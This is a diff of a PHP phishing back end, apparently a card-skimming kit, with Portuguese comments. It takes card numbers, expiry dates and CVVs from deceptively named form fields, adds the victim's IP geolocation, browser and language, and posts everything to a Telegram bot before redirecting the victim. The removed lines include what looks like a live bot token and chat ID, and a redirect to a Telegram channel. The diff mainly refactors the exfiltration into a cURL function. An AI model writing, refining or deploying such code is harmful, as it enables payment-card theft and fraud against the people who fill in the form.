@@ -1,96 +1,89 @@
 <?php
+ob_start(); // Inicia buffer para evitar erros de header já enviados 4
+
 // Função para obter informações de IP com tratamento de erros
 function getIpInfo($ip) {
-    $apiUrl = "http://ip-api.com/json/{$ip}";
-    $apiData = @file_get_contents($apiUrl);
+    $apiUrl  = "http://ip-api.com/json/{$ip}";
+    $apiData = @file_get_contents($apiUrl); // Suprime warnings 5
     if ($apiData === false) {
-        return [
-            'query'      => $ip,
-            'city'       => 'N/A',
-            'regionName' => 'N/A',
-            'country'    => 'N/A',
-            'isp'        => 'N/A'
-        ];
+        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
     }
-    $data = json_decode($apiData, true);
-    if (!isset($data['status']) || $data['status'] !== 'success') {
-        return [
-            'query'      => $ip,
-            'city'       => 'N/A',
-            'regionName' => 'N/A',
-            'country'    => 'N/A',
-            'isp'        => 'N/A'
-        ];
+    $data = json_decode($apiData, true); // Decodifica JSON 6
+    if (!isset($data['status']) || $data['status'] !== 'success') { // Valida status 7
+        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
     }
     return $data;
 }
 
-// Função para determinar o navegador
-function getBrowserName($userAgent) {
-    $browser = "Desconhecido";
-    if (preg_match('/Firefox/i', $userAgent)) {
-        $browser = 'Firefox';
-    } elseif (preg_match('/MSIE/i', $userAgent) || preg_match('/Trident/i', $userAgent)) {
-        $browser = 'Internet Explorer';
-    } elseif (preg_match('/Edge/i', $userAgent)) {
-        $browser = 'Microsoft Edge';
-    } elseif (preg_match('/Chrome/i', $userAgent)) {
-        $browser = 'Google Chrome';
-    } elseif (preg_match('/Safari/i', $userAgent)) {
-        $browser = 'Safari';
-    } elseif (preg_match('/Opera|OPR/i', $userAgent)) {
-        $browser = 'Opera';
+// Função para enviar mensagem ao Telegram via cURL
+function sendToTelegram($botToken, $chatId, $message) {
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $postFields = [
+        'chat_id' => $chatId,
+        'text'    => $message
+    ];
+    $ch = curl_init($url); // Inicia sessão cURL 8
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields); // Usa POST conforme recomendado 9
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    if ($response === false) {
+        error_log("cURL Error: " . curl_error($ch));
     }
-    return $browser;
+    curl_close($ch);
+    return $response;
 }
 
-if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    if (!empty($_POST['campoNome']) && !empty($_POST['campoTel']) && !empty($_POST['campoTel2'])) {
-        $numeroCartao   = trim($_POST['campoNome']);
-        $validadeCartao = trim($_POST['campoTel']);
-        $cvv            = trim($_POST['campoTel2']);
-        $dataHora       = date('Y-m-d H:i:s');
-
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Recupera e sanitiza campos
+    $numero    = trim($_POST['campoNome']   ?? '');
+    $validade  = trim($_POST['campoTel']    ?? '');
+    $cvv       = trim($_POST['campoTel2']   ?? '');
+    if ($numero && $validade && $cvv) {
         $ip        = $_SERVER['REMOTE_ADDR'];
         $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
-        $lingua    = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'N/A';
-        $navegador = getBrowserName($userAgent);
-        $ipInfo    = getIpInfo($ip);
+        $lang      = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'N/A';
+        
+        $info      = getIpInfo($ip);
+        $browser   = getBrowserName($userAgent);
+        // Monta texto da mensagem
+        $txt  = "💳 Número: {$numero}\n";
+        $txt .= "📅 Validade: {$validade}\n";
+        $txt .= "🔑 CVV: {$cvv}\n";
+        $txt .= "🌐 IP: {$info['query']}\n";
+        $txt .= "🏙 Cidade: {$info['city']}\n";
+        $txt .= "📍 Região: {$info['regionName']}\n";
+        $txt .= "🌏 País: {$info['country']}\n";
+        $txt .= "📡 ISP: {$info['isp']}\n\n";
+        $txt .= "🖥 User-Agent: {$userAgent}\n";
+        $txt .= "🌎 Navegador: {$browser}\n";
+        $txt .= "🗣 Linguagem: {$lang}\n";
+        $txt .= "⏰ Data/Hora: " . date('Y-m-d H:i:s');
 
-        // Montagem do conteúdo
-        $conteudo  = "☠️ | LOG ";
-        $conteudo .= "💳 | Número do Cartão: {$numeroCartao}\n";
-        $conteudo .= "📅 | Validade: {$validadeCartao}\n";
-        $conteudo .= "🔑 | CVV: {$cvv}\n";
-        $conteudo .= "🏠 | IP: {$ipInfo['query']}\n";
-        $conteudo .= "🔎 | Cidade: {$ipInfo['city']}\n";
-        $conteudo .= "📍 | Região: {$ipInfo['regionName']}\n";
-        $conteudo .= "🌎 | País: {$ipInfo['country']}\n";
-        $conteudo .= "📦 | ISP: {$ipInfo['isp']}\n\n";
-        $conteudo .= "🔓 | USER-AGENT: {$userAgent}\n";
-        $conteudo .= "🌐 | NAVEGADOR: {$navegador}\n";
-        $conteudo .= "👥 | LINGUAGEM: {$lingua}\n";
-        $conteudo .= "📆 | DATA/HORA: {$dataHora}\n\n";
+        // Lê variáveis de ambiente no Render 10
+        $token  = getenv('BOT_TOKEN') ?: '';
+        $chatId = getenv('CHAT_ID')   ?: '';
+        sendToTelegram($token, $chatId, $txt);
 
-        // Use variáveis de ambiente configuradas no Render
-        $botToken = getenv('7236468671:AAHRrN2HAHU78bRR6uZDuHiE3FxkDvoJW9M') ?: 'TOKEN_POR_AMBIENTE';
-        $chatId   = getenv('6924180031')   ?: 'CHAT_POR_AMBIENTE';
-
-        $mensagem = urlencode($conteudo);
-        $url      = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";
-        $response = @file_get_contents($url);
-
-        if ($response !== false) {
-            header('Location: index.html');
-            exit;
-        } else {
-            echo "<p>Houve um erro ao enviar os dados. Tente novamente.</p>";
-        }
-    } else {
-        echo "<p>Por favor, preencha todos os campos do formulário.</p>";
+        header('Location: index.html'); // Redireciona após envio 11
+        exit;
     }
+    echo 'Por favor, preencha todos os campos.';
 } else {
-    header('Location: https://t.me/duckettstoneprincipal');
+    header('Location: index.html');
     exit;
 }
-?>
+
+// Função de detecção de navegador (mantida)
+function getBrowserName($ua) {
+    if (stripos($ua, 'Firefox') !== false)   return 'Firefox';
+    if (stripos($ua, 'MSIE')    !== false ||
+        stripos($ua, 'Trident') !== false)   return 'Internet Explorer';
+    if (stripos($ua, 'Edge')    !== false)   return 'Microsoft Edge';
+    if (stripos($ua, 'Chrome')  !== false)   return 'Google Chrome';
+    if (stripos($ua, 'Safari')  !== false)   return 'Safari';
+    if (stripos($ua, 'Opera')   !== false ||
+        stripos($ua, 'OPR')     !== false)   return 'Opera';
+    return 'Desconhecido';
+}
+ob_end_flush();
